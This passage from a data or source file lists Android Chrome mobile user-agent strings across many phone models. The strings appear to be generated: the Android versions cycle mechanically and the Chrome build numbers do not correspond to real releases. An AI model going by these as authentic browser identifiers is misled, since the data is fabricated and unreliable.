    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2550.220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2569.227 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2588.234 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2607.241 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.2626.248 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.2645.55 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.2664.62 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2683.69 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.2702.76 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.2721.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.2740.90 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.2759.97 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.2778.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.2797.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.2816.118 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.2835.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.2854.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.2873.139 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.2892.146 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2911.153 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.2930.160 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.2949.167 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.2968.174 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2987.181 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3006.188 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3025.195 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3044.202 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3063.209 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3082.216 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3101.223 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3120.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3139.237 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3158.244 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3177.51 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3196.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3215.65 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3234.72 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3253.79 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3272.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3291.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3310.100 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3329.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3348.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3367.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3386.128 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3405.135 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3424.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3443.149 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3462.156 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3481.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3500.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3519.177 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3538.184 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3557.191 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3576.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3595.205 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3614.212 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.3633.219 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.3652.226 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.3671.233 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.3690.240 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3709.247 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.3728.54 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.3747.61 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.3766.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3785.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.3804.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.3823.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3842.96 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.3861.103 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.3880.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.3899.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3918.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.3937.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.3956.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.3975.145 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.3994.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4013.159 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4032.166 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4051.173 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4070.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4089.187 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4108.194 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4127.201 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4146.208 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4165.215 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4184.222 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4203.229 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4222.236 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4241.243 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4260.50 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4279.57 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4298.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4317.71 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4336.78 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4355.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4374.92 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4393.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4412.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4431.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4450.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4469.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4488.134 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4507.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4526.148 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4545.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4564.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4583.169 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4602.176 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4621.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4640.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4659.197 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4678.204 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4697.211 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4716.218 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.4735.225 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4754.232 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.4773.239 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.4792.246 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4811.53 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4830.60 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4849.67 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4868.74 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.4887.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4906.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.4925.95 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.4944.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.4963.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4982.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5001.123 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5020.130 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5039.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5058.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5077.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5096.158 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5115.165 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5134.172 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.5153.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Infinix X676C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5172.186 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 2201116SR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5191.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; 2201123G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5210.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; 22041219I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5229.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; M2101K9AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5248.214 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; M2102K1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5267.221 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5286.228 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5305.235 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5324.242 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5343.249 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5362.56 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia G50) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5381.63 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Nokia G21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5400.70 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; TECNO KJ7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5419.77 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5438.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi 9A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5457.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi 9C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5476.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5495.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Moto G9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5514.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Moto G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.5533.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2204) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5552.126 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH1869) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5571.133 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5590.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2107) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5609.147 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5628.154 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5647.161 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A336B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5666.168 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5685.175 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5704.182 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A736B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5723.189 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; itel A56) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5742.196 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5761.203 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5780.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5799.217 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5818.224 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5837.231 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.5856.238 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.5875.245 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.5894.52 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.5913.59 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.5932.66 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; CPH2451) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5951.73 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5970.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2473) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5989.87 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; CPH2381) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.6008.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; RMX3371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.6027.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; RMX3516) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.6046.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; RMX3461) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.6065.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; RMX3286) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.6084.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.6103.129 Mobile Safari/537.36",
